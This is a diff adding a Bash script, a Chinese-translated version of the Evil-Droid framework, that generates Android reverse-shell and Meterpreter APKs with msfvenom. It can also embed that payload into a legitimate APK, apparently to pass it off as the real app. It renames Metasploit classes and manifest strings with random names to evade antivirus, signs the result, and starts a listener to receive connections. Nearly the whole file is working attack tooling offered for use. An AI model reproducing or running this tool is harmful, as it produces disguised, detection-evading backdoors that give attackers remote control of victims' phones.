@@ -1,0 +1,313 @@
+#!/usr/bin/env bash
+#
+# Evil-Droid框架 版本 0.2
+# Evil-Droid是一个用于创建、生成并嵌入APK payload以渗透Android平台的框架
+# 
+#                  原作者: Mascerano Bachir
+#                 汉化作者: sethAion
+#                 网站: http://www.dev-labs.co
+#           YouTube: https://www.youtube.com/c/mascerano%20bachir  
+#        Facebook: https://www.facebook.com/kali.linux.pentesting.tutorials
+# 特别鸣谢: MrPedroubuntu, Kader Achraf 和 Mohammed Yacine
+# 中国地区汉化维护者: @sethaion
+#
+# 这是一个开源工具，如果您想修改或添加内容，请给我一份副本。
+
+# 检查 root 权限
+[[ `id -u` -eq 0 ]] || { echo -e "\e[1;31m您必须是root用户才能运行此脚本\e[0m"; exit 1; }
+
+# 定义颜色
+cyan='\e[0;36m'
+lightcyan='\e[96m'
+green='\e[0;32m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[1;33m'
+blue='\e[1;34m'
+reset='\e[0m'
+
+# 检查和安装 dig
+install_dig() {
+    if ! command -v dig >/dev/null 2>&1; then
+        echo -e "${yellow}dig 未安装，正在安装...${reset}"
+        if [ -f /etc/debian_version ]; then
+            apt-get update -y && apt-get install dnsutils -y
+        elif [ -f /etc/redhat-release ]; then
+            yum install bind-utils -y
+        else
+            echo -e "${red}不支持的系统，无法安装 dig${reset}"
+            exit 1
+        fi
+    fi
+    echo -e "${green}dig 已就绪${reset}"
+}
+
+# 检查互联网连接
+check_internet() {
+    curl -s --head http://www.baidu.com >/dev/null 2>&1
+    if [ $? -ne 0 ]; then
+        echo -e "${yellow}检查互联网连接: ${red}失败${reset}"
+        echo -e "${red}此脚本需要活跃的互联网连接${reset}"
+        exit 1
+    fi
+    echo -e "${yellow}检查互联网连接: ${green}已连接${reset}"
+}
+
+# 初始化环境
+init_env() {
+    install_dig
+    check_internet
+    path=$(pwd)
+    lanip=$(ip route get 1 | awk '{print $NF;exit}')
+    publicip=$(dig +short myip.opendns.com @resolver1.opendns.com 2>/dev/null || echo "无法获取公网IP")
+    ver="v0.2"
+    # 随机变量用于规避AV
+    VAR1=$(tr -cd 'a-z' </dev/urandom | head -c 10)
+    VAR2=$(tr -cd 'a-z' </dev/urandom | head -c 10)
+    VAR3=$(tr -cd 'a-z' </dev/urandom | head -c 10)
+    VAR4=$(tr -cd 'a-z' </dev/urandom | head -c 10)
+    VAR5=$(tr -cd 'a-z' </dev/urandom | head -c 10)
+    VAR6=$(tr -cd 'a-z' </dev/urandom | head -c 10)
+    VAR7=$(tr -cd 'a-z' </dev/urandom | head -c 10)
+    VAR8=$(tr -cd 'a-z' </dev/urandom | head -c 10)
+    mkdir -p "$path/evilapk" 2>/dev/null
+    echo -e "${yellow}初始化完成${reset}"
+}
+
+# 加载动画
+spinlong() {
+    local bar=" +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+    local barlength=${#bar}
+    local i=0
+    while ((i < 100)); do
+        n=$((i * barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM % 5 + 2))
+        sleep 0.02
+    done
+    echo
+}
+
+# 检查并安装依赖
+check_deps() {
+    local deps=(msfconsole xterm aapt apktool zipalign)
+    for dep in "${deps[@]}"; do
+        if ! command -v "$dep" >/dev/null 2>&1; then
+            echo -e "${red}[X] $dep 未找到，正在安装...${reset}"
+            apt-get install -y "${dep/apktool/apktool}" "android-framework-res" 2>/dev/null || {
+                echo -e "${red}安装 $dep 失败，请手动安装${reset}"
+                exit 1
+            }
+        else
+            echo -e "${green}[✔] $dep 已安装${reset}"
+        fi
+    done
+}
+
+# 启动服务
+start_services() {
+    systemctl start apache2 >/dev/null 2>&1 || echo -e "${yellow}警告: apache2 服务启动失败${reset}"
+    systemctl start postgresql >/dev/null 2>&1 || echo -e "${yellow}警告: postgresql 服务启动失败${reset}"
+    echo -e "${green}服务已启动${reset}"
+}
+
+# 停止服务
+stop_services() {
+    systemctl stop apache2 >/dev/null 2>&1
+    systemctl stop postgresql >/dev/null 2>&1
+    echo -e "${yellow}服务已停止${reset}"
+}
+
+# Ctrl+C 退出
+trap ctrl_c INT
+ctrl_c() {
+    echo -e "${red}[*] 检测到 Ctrl+C，正在退出...${reset}"
+    stop_services
+    exit 0
+}
+
+# 获取 LHOST
+get_lhost() {
+    read -p "请输入 LHOST (默认: $lanip): " LHOST
+    LHOST=${LHOST:-$lanip}
+    echo -e "${green}LHOST 设置为: $LHOST${reset}"
+}
+
+# 获取 LPORT
+get_lport() {
+    read -p "请输入 LPORT (默认: 4444): " LPORT
+    LPORT=${LPORT:-4444}
+    echo -e "${green}LPORT 设置为: $LPORT${reset}"
+}
+
+# 获取 payload
+get_payload() {
+    echo -e "${yellow}可用 payload:${reset}"
+    echo "1) android/shell/reverse_tcp"
+    echo "2) android/meterpreter/reverse_tcp"
+    echo "3) android/meterpreter/reverse_https"
+    read -p "请选择 payload (默认: 1): " choice
+    case $choice in
+        2) PAYLOAD="android/meterpreter/reverse_tcp" ;;
+        3) PAYLOAD="android/meterpreter/reverse_https" ;;
+        *) PAYLOAD="android/shell/reverse_tcp" ;;
+    esac
+    echo -e "${green}Payload 设置为: $PAYLOAD${reset}"
+}
+
+# 获取 APK 名称
+payload_name() {
+    read -p "请输入 APK 名称 (默认: evilapk): " apk_name
+    apk_name=${apk_name:-evilapk}
+    echo -e "${green}APK 名称设置为: $apk_name${reset}"
+}
+
+# 获取原始 APK 文件路径
+orig_apk() {
+    read -p "请输入原始 APK 文件路径: " orig
+    [ -f "$orig" ] || { echo -e "${red}APK 文件不存在${reset}"; exit 1; }
+    echo -e "${green}原始 APK 设置为: $orig${reset}"
+}
+
+# 生成 APK payload
+gen_payload() {
+    echo -e "${yellow}[*] 正在生成 APK payload${reset}"
+    spinlong
+    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android R -o "$path/evilapk/$apk_name.apk" >/dev/null 2>&1
+    [ $? -eq 0 ] || { echo -e "${red}生成 APK 失败${reset}"; exit 1; }
+    echo -e "${green}APK 已生成: $path/evilapk/$apk_name.apk${reset}"
+}
+
+# 嵌入 payload 到原始 APK
+embed_payload() {
+    echo -e "${yellow}[*] 正在将 payload 嵌入原始 APK${reset}"
+    spinlong
+    msfvenom -x "$orig" -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -a dalvik --platform android R -o "$path/evilapk/$apk_name.apk" >/dev/null 2>&1
+    [ $? -eq 0 ] || { echo -e "${red}嵌入 payload 失败${reset}"; exit 1; }
+    echo -e "${green}后门 APK 已生成: $path/evilapk/$apk_name.apk${reset}"
+}
+
+# 反编译 APK
+apk_decomp() {
+    echo -e "${yellow}[*] 正在反编译 APK${reset}"
+    spinlong
+    apktool d -f -o "$path/payload" "$path/evilapk/$apk_name.apk" >/dev/null 2>&1
+    [ $? -eq 0 ] || { echo -e "${red}反编译失败${reset}"; exit 1; }
+}
+
+# 重建 APK
+apk_comp() {
+    echo -e "${yellow}[*] 正在重建 APK${reset}"
+    spinlong
+    apktool b "$path/payload" -o "$path/evilapk/$apk_name.apk" >/dev/null 2>&1
+    [ $? -eq 0 ] || { echo -e "${red}重建失败${reset}"; exit 1; }
+    rm -rf "$path/payload" 2>/dev/null
+}
+
+# 签名 APK
+sign_apk() {
+    echo -e "${yellow}[*] 正在签名 APK${reset}"
+    spinlong
+    if [ ! -f ~/.android/debug.keystore ]; then
+        mkdir -p ~/.android 2>/dev/null
+        keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Android Debug,O=Android,C=US" >/dev/null 2>&1
+    fi
+    jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA "$path/evilapk/$apk_name.apk" androiddebugkey >/dev/null 2>&1
+    [ $? -eq 0 ] || { echo -e "${red}签名失败${reset}"; exit 1; }
+    echo -e "${green}APK 已签名: $path/evilapk/$apk_name.apk${reset}"
+}
+
+# 规避 AV
+bypass_av() {
+    echo -e "${yellow}[*] 正在处理 APK 以规避 AV${reset}"
+    spinlong
+    mv "$path/payload/smali/com/metasploit" "$path/payload/smali/com/$VAR1" 2>/dev/null
+    mv "$path/payload/smali/com/$VAR1/stage" "$path/payload/smali/com/$VAR1/$VAR2" 2>/dev/null
+    mv "$path/payload/smali/com/$VAR1/$VAR2/Payload.smali" "$path/payload/smali/com/$VAR1/$VAR2/$VAR3.smali" 2>/dev/null
+    sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" "$path/payload/smali/com/$VAR1/$VAR2/"* 2>/dev/null
+    sed -i "s#Payload#$VAR3#g" "$path/payload/smali/com/$VAR1/$VAR2/"* 2>/dev/null
+    sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" "$path/payload/smali/com/$VAR1/$VAR2/$VAR3.smali" 2>/dev/null
+    sed -i "s#payload#$VAR7#g" "$path/payload/smali/com/$VAR1/$VAR2/$VAR3.smali" 2>/dev/null
+    sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" "$path/payload/AndroidManifest.xml" 2>/dev/null
+    sed -i "s#metasploit#$VAR8#" "$path/payload/AndroidManifest.xml" 2>/dev/null
+}
+
+# 主菜单
+main() {
+    clear
+    while :; do
+        echo -e "${green}"
+        echo "╔──────────────────────────────────────────────╗"
+        echo "|          Evil-Droid框架 $ver               |"
+        echo "|      渗透测试Android平台                  |"
+        echo "┖──────────────────────────────────────────────┙"
+        echo "[1] APK MSF                                     "
+        echo "[2] 后门原始APK                               "
+        echo "[3] 绕过AV的APK                               "
+        echo "[4] 启动监听器                                "
+        echo "[c] 清理                                       "
+        echo "[q] 退出                                       "
+        read -p "[?] 选择>: " option
+        echo -e "${reset}"
+        
+        case "$option" in
+            1)
+                echo -e "${lightgreen}[✔] APK MSF${reset}"
+                get_lhost
+                get_lport
+                payload_name
+                get_payload
+                gen_payload
+                ;;
+            2)
+                echo -e "${lightgreen}[✔] 后门原始APK${reset}"
+                get_lhost
+                get_lport
+                payload_name
+                get_payload
+                orig_apk
+                embed_payload
+                ;;
+            3)
+                echo -e "${lightgreen}[✔] 绕过AV的APK${reset}"
+                get_lhost
+                get_lport
+                payload_name
+                get_payload
+                gen_payload
+                apk_decomp
+                bypass_av
+                apk_comp
+                sign_apk
+                ;;
+            4)
+                echo -e "${lightgreen}[✔] 启动监听器${reset}"
+                get_lhost
+                get_lport
+                get_payload
+                xterm -T "EVIL-DROID 监听器" -e "msfconsole -x 'use multi/handler; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'" &
+                ;;
+            c)
+                echo -e "${lightgreen}[✔] 清理文件${reset}"
+                rm -rf "$path/evilapk/"* "$path"/*.jpeg "$path"/*.txt /var/www/html/*.apk 2>/dev/null
+                echo -e "${green}文件已清理${reset}"
+                ;;
+            q)
+                echo -e "${yellow}再见！${reset}"
+                stop_services
+                exit 0
+                ;;
+            *)
+                echo -e "${red}[X] 无效选项，请输入有效数字${reset}"
+                sleep 2
+                ;;
+        esac
+    done
+}
+
+# 初始化并启动
+init_env
+check_deps
+start_services
+main
